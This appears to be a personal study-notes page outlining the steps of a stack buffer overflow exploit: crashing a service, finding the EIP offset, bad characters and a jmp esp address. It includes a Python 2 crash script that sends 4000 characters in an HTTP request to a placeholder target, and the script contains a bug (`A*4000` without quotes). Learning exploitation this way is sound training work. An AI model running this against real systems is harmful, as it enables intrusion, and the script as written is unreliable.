---
layout: page
title: Steps to Reproduce
permalink: /notes/security/BufferOverflow/steps-to-reproduce
notes_section: Security
notes_category: Buffer Overflow
notes_label: Steps to Reproduce
notes_order: 2
---

## Steps to reproduce

1. Crash the application
2. Find EIP location
3. Confirm EIP location
4. Find bad chars
5. Remove bad chars from shellcode
6. Find jmpesp value

```
#!/bin/python

import socket

s=socket.socket()
s.connect(("<target ip>", <target port>))
junk=A*4000

m1="GET"
m2="HTTP/1.1\r\n\r\n"
m=m1+junk+m2

s.send(m)

print s.recv(100)

s.close()
```


1. Crash the application by sending large number of random characters
2. Use pattern_create.rb -l <no. at which the application crashed>
3. Note the EIP value
4. Use the EIP value in pattern_offset.rb -q
5. You will get the exact offset value.
6. Add extra characters to overflow EIP
7. Check whether the EIP value changes or not
8. The EIP value must change and remain.
9. Send badchars to the target and identify the bad chars.
10. Identify and note the "jmpesp value"
